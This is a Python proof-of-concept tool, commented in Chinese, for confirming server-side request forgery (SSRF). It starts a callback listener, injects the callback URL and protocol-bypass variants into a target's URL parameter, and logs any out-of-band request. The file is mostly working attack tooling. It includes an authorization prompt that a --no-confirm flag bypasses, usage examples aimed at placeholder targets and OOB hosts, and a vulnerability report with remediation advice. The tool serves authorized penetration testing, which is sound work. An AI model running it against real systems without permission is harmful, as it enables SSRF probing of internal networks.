#!/usr/bin/env python3
"""
PoC: SSRF带外证明工具
================================
用途: 证明SSRF漏洞存在，通过使目标服务器向攻击者控制的监听器发送请求
方案: 启动本地HTTP监听器，生成唯一回调URL，发送给目标，等待回调

使用条件: ONLY FOR AUTHORIZED SECURITY TESTING
你必须获得目标系统的书面授权才能使用此工具。

工作流程:
  1. 启动一个轻量级HTTP服务器监听本地端口
  2. 生成唯一的、一次性的回调URL
  3. 将回调URL作为SSRF payload发送给目标
  4. 等待目标服务器发起连接 (回调)
  5. 记录回调作为漏洞存在证据

版本: 1.0.0
"""

import argparse
import sys
import time
import uuid
import json
import threading
import socket
import hashlib
from datetime import datetime
from urllib.parse import urlparse, quote

try:
    import requests
except ImportError:
    print("[!] 缺少依赖: requests")
    print("    安装: pip install requests")
    sys.exit(1)


# ============================================================
# 授权确认
# ============================================================
def confirm_authorization():
    """显示授权声明并等待用户确认"""
    print("=" * 70)
    print("  SSRF带外证明工具 - SSRF OOB Proof PoC")
    print("=" * 70)
    print()
    print("  [重要声明]")
    print("  本工具仅用于**已获得明确书面授权**的安全测试。")
    print("  未经授权使用本工具攻击目标系统属于违法行为。")
    print("  使用者需自行承担所有法律责任。")
    print()
    print("  本工具的行为: ")
    print("  - 启动本地HTTP监听器接收回调请求")
    print("  - 生成唯一回调URL证明SSRF存在")
    print("  - 仅记录回调请求的元数据 (来源IP、时间、路径)")
    print("  - 不会尝试交互或攻击目标内部网络")
    print("  - 监听器会自动在指定时间后关闭")
    print()
    print("  [合规要求]")
    print("  1. 你拥有目标系统的书面渗透测试授权")
    print("  2. 你已获得测试范围书面确认")
    print("  3. 你了解并遵守当地法律法规")
    print("  4. 测试环境与被测目标之间的网络可达")
    print()
    try:
        resp = input("  继续执行请输 'yes' 确认授权 > ").strip().lower()
        if resp != "yes":
            print("\n  [!] 已取消操作。请在获得授权后再使用本工具。")
            return False
    except (EOFError, KeyboardInterrupt):
        print("\n  [!] 用户取消操作。")
        return False
    print()
    return True


# ============================================================
# 轻量级HTTP回调服务器
# ============================================================
class OobCallbackServer:
    """
    轻量级HTTP回调服务器
    监听指定端口，接收目标服务器的回调请求
    记录请求元数据作为SSRF存在证据
    """

    def __init__(self, host="0.0.0.0", port=9999, token_length=8):
        self.host = host
        self.port = port
        self._server = None
        self._thread = None
        self.callbacks = []
        self._running = False
        self._token = uuid.uuid4().hex[:token_length]

        try:
            # 尝试绑定端口
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.settimeout(1.0)
            self._sock.bind((self.host, self.port))
            self._sock.listen(5)
            self._running = True
        except OSError as e:
            print(f"    [!] 端口 {port} 绑定失败: {e}")
            print(f"    [*] 尝试使用其他端口...")
            # 尝试自动选择端口
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.settimeout(1.0)
            self._sock.bind((self.host, 0))
            self.port = self._sock.getsockname()[1]
            self._sock.listen(5)
            self._running = True
            print(f"    [*] 已绑定到随机端口: {self.port}")

    @property
    def callback_url(self):
        """获取回调URL"""
        return f"http://{self.host}:{self.port}/oob/{self._token}"

    @property
    def callback_token(self):
        """获取回调令牌"""
        return self._token

    def _handle_request(self, conn, addr):
        """处理单个HTTP请求"""
        client_ip = addr[0]
        client_port = addr[1]
        timestamp = datetime.utcnow().isoformat() + "Z"

        try:
            data = conn.recv(4096)
            if data:
                # 解析请求行
                request_text = data.decode("utf-8", errors="replace")
                lines = request_text.split("\r\n")
                request_line = lines[0] if lines else ""

                # 提取请求信息
                parts = request_line.split(" ")
                method = parts[0] if len(parts) > 0 else "UNKNOWN"
                path = parts[1] if len(parts) > 1 else "UNKNOWN"
                http_version = parts[2] if len(parts) > 2 else "UNKNOWN"

                # 提取Host头
                host_header = ""
                for line in lines:
                    if line.lower().startswith("host:"):
                        host_header = line.split(":", 1)[1].strip()
                        break

                # 记录回调 (仅元数据)
                callback = {
                    "id": hashlib.md5(f"{client_ip}:{client_port}:{timestamp}".encode()).hexdigest()[:12],
                    "timestamp": timestamp,
                    "client_ip": client_ip,
                    "client_port": client_port,
                    "method": method,
                    "path": path,
                    "host_header": host_header,
                    "token_valid": self._token in path,
                }
                self.callbacks.append(callback)

                # 发送HTTP响应 (非常简短，不包含任何跟踪信息)
                response = (
                    "HTTP/1.1 200 OK\r\n"
                    "Content-Type: text/plain\r\n"
                    f"Content-Length: 2\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                    "OK"
                )
                conn.sendall(response.encode())
        except Exception as e:
            print(f"    [警告] 处理请求时出错: {e}")
        finally:
            conn.close()

    def start(self):
        """在新线程中启动服务器"""
        def serve():
            while self._running:
                try:
                    conn, addr = self._sock.accept()
                    t = threading.Thread(target=self._handle_request, args=(conn, addr))
                    t.daemon = True
                    t.start()
                except socket.timeout:
                    continue
                except OSError:
                    break

        self._thread = threading.Thread(target=serve)
        self._thread.daemon = True
        self._thread.start()

    def stop(self):
        """停止服务器"""
        self._running = False
        try:
            self._sock.close()
        except OSError:
            pass

    def wait_for_callback(self, timeout=30, poll_interval=0.5):
        """
        等待回调到达
        返回: (bool: 是否收到回调, list: 回调列表)
        """
        initial_count = len(self.callbacks)
        elapsed = 0
        while elapsed < timeout:
            if len(self.callbacks) > initial_count:
                return True, self.callbacks[initial_count:]
            time.sleep(poll_interval)
            elapsed += poll_interval
        return False, []


# ============================================================
# SSRF Payload生成
# ============================================================
def generate_ssrf_payloads(callback_url, injection_type="url"):
    """
    根据不同的SSRF场景生成payload
    injection_type:
      - url: 直接在URL参数中替换
      - host: 替换Host头
      - redirect: 利用302跳转
    """
    payloads = {}

    if injection_type == "url":
        payloads = {
            "直接替换": callback_url,
            "协议绕过 (http)": callback_url.replace("http://", ""),
            "协议绕过 (双斜杠)": f"//{urlparse(callback_url).hostname}:{urlparse(callback_url).port}",
            "DNS重绑定测试": callback_url,  # 占位
        }
    elif injection_type == "host":
        payloads = {
            "Host头注入": urlparse(callback_url).hostname,
        }
    elif injection_type == "redirect":
        payloads = {
            "伪造跳转目标": callback_url,
        }

    return payloads


# ============================================================
# SSRF检测
# ============================================================
def test_ssrf_url_param(target_url, param_name, callback_url, delay_ms):
    """
    SSRF检测 - URL参数场景
    将回调URL注入到目标参数中，看目标是否会访问
    """
    rate_limiter = __import__("time")
    import urllib.parse

    print("\n  [步骤1] 构造并发送SSRF payload")
    print("  " + "-" * 50)

    payloads = generate_ssrf_payloads(callback_url, "url")

    sent_urls = []
    for name, payload in payloads.items():
        print(f"    [*] payload: {name}")
        print(f"       {payload}")

        # 替换目标URL中的参数值
        parsed = urlparse(target_url)
        import urllib.parse as up
        params = up.parse_qs(parsed.query)

        if param_name in params:
            params[param_name] = [payload]
            new_query = up.urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            # 如果目标URL中没有该参数，直接附加
            sep = "&" if parsed.query else ""
            test_url = f"{target_url}{sep}{param_name}={up.quote(payload)}"

        print(f"       完整URL: {test_url}")

        # 发送请求
        try:
            resp = requests.get(test_url, timeout=10, verify=False)
            print(f"       响应: {resp.status_code} ({len(resp.text)} bytes)")
        except Exception as e:
            print(f"       请求超时/失败: {str(e)[:60]}")

        sent_urls.append(test_url)

        # 如果已经收到回调，提前结束
        if callback_url in str(getattr(sys.modules[__name__], '_oob_server_callbacks', [])):
            print("\n    [!] 已收到回调请求!")
            break

        rate_limiter.sleep(delay_ms / 1000.0)

    return sent_urls


def test_ssrf_redirect(target_url, param_name, callback_url, delay_ms):
    """
    SSRF检测 - 302跳转场景
    如果目标应用存在SSRF跳转，测试跳转到回调URL
    这个功能需要自己的SSRF服务器，这里用直接请求目标实现
    """
    # 简化版: 构造一个可能触发跳转的payload
    # 实际场景中，可能需要配合自己的302跳转服务
    print("\n  [步骤2] (可选) 302跳转SSRF检测")
    print("  " + "-" * 50)
    print("    [*] 直接跳转测试通常需要配合外部跳转服务器")
    print("    [*] 建议使用公开的跳转服务或自建服务器")
    print("    [*] 例如: http://target.com/redirect?url=CALLBACK_URL")
    return []


# ============================================================
# 报告生成
# ============================================================
def generate_report(target_url, param_name, callback_url, callbacks):
    """生成SSRF漏洞报告"""
    if not callbacks:
        return None

    callback_records = []
    for cb in callbacks:
        callback_records.append({
            "id": cb["id"],
            "timestamp": cb["timestamp"],
            "client_ip": cb["client_ip"],
            "method": cb["method"],
            "path": cb["path"],
        })

    report = {
        "vulnerability": "SSRF (Server-Side Request Forgery / 服务端请求伪造)",
        "target": target_url,
        "injection_param": param_name,
        "callback_url": callback_url,
        "callback_count": len(callbacks),
        "severity": "High / Critical (取决于目标内部网络拓扑)",
        "callback_details": callback_records,
        "tested_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        "disclaimer": "仅接收了回调请求的元数据 (来源IP/时间/路径)，未与目标内部系统交互",
        "recommendations": [
            "对用户输入的URL进行严格的白名单域名验证",
            "禁止访问内网IP段 (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
            "使用URL解析库验证协议，只允许 http/https",
            "限制请求的目标端口范围",
            "对出站流量进行网络层面的访问控制",
            "使用独立的SSRF防护中间件",
        ],
    }

    return report


# ============================================================
# 网络可达性检查
# ============================================================
def check_network_reachability(host, port):
    """检查本机的网络可达性和端口绑定"""
    print("\n  [网络检查]")
    print("  " + "-" * 50)

    # 获取本机IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        print(f"    [*] 本机外网IP: {local_ip}")
    except Exception:
        local_ip = "127.0.0.1"
        print(f"    [*] 本机IP: {local_ip} (无法确定外网IP)")

    print(f"    [*] 监听端口: {port}")
    print()
    print("    [注意] 要让目标服务器能回调到你的监听器，需要:")
    print("    - 监听端口在目标服务器网络可达的IP上")
    print("    - 防火墙/安全组允许入站连接到此端口")
    print("    - 如果目标在内网，你可能需要在内网环境中执行此脚本")
    print("    - 如果目标在公网，可以使用具有公网IP的VPS执行")
    print()
    print("    [建议] 如果无法直接接收回调，可以:")
    print("    1. 使用公开的OOB平台 (如 interactsh, burpcollaborator)")
    print("    2. 在具有公网IP的VPS上运行此脚本")
    print("    3. 使用DNSLog方式 (域名解析记录)")

    return local_ip


# ============================================================
# 主流程
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description="SSRF带外证明工具 - SSRF OOB Proof PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # 基本用法 - 监听本地9999端口
  python ssrf_oob_proof.py -u "http://target.com/fetch?url=SSRF_PLACEHOLDER" \\
      -p SSRF_PLACEHOLDER -l 9999

  # 指定监听IP和端口
  python ssrf_oob_proof.py -u "http://target.com/proxy?target=INJECT" \\
      -p INJECT -l 0.0.0.0:8888

  # 使用外部OOB平台 (不启动本地监听)
  python ssrf_oob_proof.py -u "http://target.com/fetch?url=CALLBACK" \\
      -p CALLBACK --external "http://your-oob-server.com/token"

  # 较长的等待时间
  python ssrf_oob_proof.py -u "http://target.com/load?url=INJECT" \\
      -p INJECT -l 9999 -w 60

注意事项:
  - 本地监听器需要目标服务器网络可达
  - 如果目标在内网，监听器也必须在同一内网
  - 监控时间结束后自动退出
  - 本工具不会主动扫描内网
        """,
    )

    parser.add_argument(
        "-u", "--url",
        required=True,
        help="目标URL，包含占位符 (如: http://target.com/fetch?url=INJECT)",
    )
    parser.add_argument(
        "-p", "--placeholder",
        default="INJECT",
        help="SSRF注入点占位符 (默认: INJECT)",
    )
    parser.add_argument(
        "-l", "--listen",
        default="0.0.0.0:9999",
        help="监听地址和端口 (默认: 0.0.0.0:9999)",
    )
    parser.add_argument(
        "-w", "--wait",
        type=int,
        default=30,
        help="等待回调的超时时间，单位秒 (默认: 30)",
    )
    parser.add_argument(
        "-d", "--delay",
        type=int,
        default=800,
        help="请求间隔延迟，单位毫秒 (默认: 800)",
    )
    parser.add_argument(
        "--external",
        help="使用外部OOB平台URL，代替本地监听 (如: http://your-server.com/cb)",
    )
    parser.add_argument(
        "--param",
        default="url",
        help="注入参数名 (默认: url)",
    )
    parser.add_argument(
        "--no-confirm",
        action="store_true",
        help="跳过授权确认 (仅脚本调用时使用)",
    )

    args = parser.parse_args()

    # 授权确认
    if not args.no_confirm and not confirm_authorization():
        sys.exit(1)

    # 验证目标URL
    parsed_target = urlparse(args.url)
    if not parsed_target.netloc:
        print("[!] 目标URL格式无效")
        sys.exit(1)

    if args.placeholder not in args.url:
        print(f"[!] 目标URL中未找到占位符 '{args.placeholder}'")
        sys.exit(1)

    print()
    print("=" * 70)
    print("  SSRF带外证明工具")
    print(f"  目标URL: {args.url}")
    print(f"  注入参数: {args.param}")
    print(f"  超时时间: {args.wait}s")
    print("=" * 70)

    # 网络检查
    listen_host, listen_port = args.listen.split(":") if ":" in args.listen else (args.listen, 9999)
    listen_port = int(listen_port)
    check_network_reachability(listen_host, listen_port)

    # --- 启动OOB回调服务器 ---
    print()
    print(">>> 启动OOB回调监听器...")
    print()

    if args.external:
        # 使用外部OOB平台
        callback_url = args.external
        print(f"    [*] 使用外部OOB平台: {callback_url}")
        print(f"    [*] 请确保外部平台已准备好接收回调")

        # 发送SSRF请求
        print("\n>>> 发送SSRF探测请求...")
        sent_urls = []
        rate_limiter = type("RL", (), {"sleep": lambda self, s: time.sleep(s)})()

        # 构造payload
        payload = callback_url
        target_url = args.url.replace(args.placeholder, quote(payload, safe=""))
        print(f"    [*] 请求: {target_url}")

        try:
            resp = requests.get(target_url, timeout=15, verify=False)
            print(f"    [*] 响应: {resp.status_code}")
        except Exception as e:
            print(f"    [*] 请求失败: {str(e)[:80]}")

        sent_urls.append(target_url)

        print(f"\n    [*] 请求已发送，请在外部OOB平台查看回调结果")
        print(f"    [*] 等待 {args.wait} 秒...")
        time.sleep(min(args.wait, 10))
        print(f"\n    [!] 请手动检查外部OOB平台是否收到回调")

        callbacks = []
        report = generate_report(args.url, args.param, callback_url, [])

    else:
        # 启动本地OOB服务器
        server = OobCallbackServer(host=listen_host, port=listen_port)
        server.start()
        callback_url = server.callback_url

        print(f"    [*] 监听器已启动: {listen_host}:{listen_port}")
        print(f"    [*] 回调URL: {callback_url}")
        print(f"    [*] 令牌: {server.callback_token}")
        print()

        # 发送SSRF探测请求
        print(">>> 发送SSRF探测请求...")
        rate_limiter = type("RL", (), {"sleep": lambda self, s: time.sleep(s)})()

        # 将回调URL注入到目标URL中
        payload = callback_url
        target_url = args.url.replace(args.placeholder, quote(payload, safe=":/"))
        print(f"    [*] 请求: {target_url}")

        try:
            resp = requests.get(target_url, timeout=15, verify=False)
            print(f"    [*] 响应: {resp.status_code}")
        except Exception as e:
            print(f"    [*] 请求失败: {str(e)[:80]}")

        sent_urls = [target_url]

        # 等待回调
        print(f"\n>>> 等待目标回调... (超时: {args.wait} 秒)")
        print("    [*] 如果目标存在SSRF，它将向你的监听器发送请求")
        print("    [*] 等待中... (按 Ctrl+C 可以提前结束)")
        print()

        start_time = time.time()
        received, callbacks = server.wait_for_callback(timeout=args.wait)
        elapsed = time.time() - start_time

        # 关闭服务器
        server.stop()

        print(f"    [*] 等待结束 (耗时: {elapsed:.1f}s)")

        if received:
            print(f"\n    [!] 收到 {len(callbacks)} 个回调请求!")
            for cb in callbacks:
                print(f"    [-] ID: {cb['id']}")
                print(f"       时间: {cb['timestamp']}")
                print(f"       来源IP: {cb['client_ip']}:{cb['client_port']}")
                print(f"       请求: {cb['method']} {cb['path']}")
                if cb['token_valid']:
                    print(f"       令牌验证: 匹配 (来源可信)")
                else:
                    print(f"       令牌验证: 不匹配 (可能来自其他扫描)")
                print()
        else:
            print(f"\n    [*] 未收到回调请求")

        report = generate_report(args.url, args.param, callback_url, callbacks)

    # --- 输出结果 ---
    print()
    print("=" * 70)

    if callbacks:
        print("  [检测结果] SSRF漏洞存在性已确认!")
        print()
        print(f"  回调来源IP: {callbacks[0]['client_ip']}")
        print(f"  回调时间: {callbacks[0]['timestamp']}")
        print(f"  回调路径: {callbacks[0]['path']}")
        print(f"  触发方式: 通过参数 {args.param} 注入回调URL")
        print()
    else:
        print("  [检测结果] 未收到回调请求")
        print()
        print("  可能的原因:")
        print("  - 目标不存在SSRF漏洞")
        print("  - 目标无法访问你的监听器 (网络不通)")
        print("  - SSRF被限制只能访问特定域名/协议")
        print("  - 需要其他注入方式 (如 Host头、Referer头)")
        print("  - 目标存在出站流量过滤")
        print()

    if report:
        print("  --- 报告编写参考 ---")
        print(f"  漏洞类型: {report['vulnerability']}")
        print(f"  影响等级: {report['severity']}")
        print(f"  漏洞描述: 在 {args.url} 发现SSRF漏洞。")
        print(f"           通过修改 {args.param} 参数，目标服务器会向")
        if callbacks:
            print(f"           攻击者控制的服务器发起HTTP请求 (回调来源: {callbacks[0]['client_ip']})。")
            print(f"           攻击者可利用此漏洞探测内网资源或访问内部服务。")
        else:
            print(f"           攻击者指定的URL发起请求。")
            print(f"           攻击者可能利用此漏洞探测内网资源。")
        print()
        print("  --- 修复建议 ---")
        for rec in report["recommendations"]:
            print(f"  - {rec}")
        print()
        print(f"  [!] 注意: {report['disclaimer']}")
        print()

        # JSON输出
        json_output = {k: v for k, v in report.items() if k != "callback_details" or callbacks}
        print("  --- 机器可读结果 (JSON) ---")
        print(f"  {json.dumps(json_output, ensure_ascii=False, indent=2)}")

    print("=" * 70)
    print()


if __name__ == "__main__":
    main()
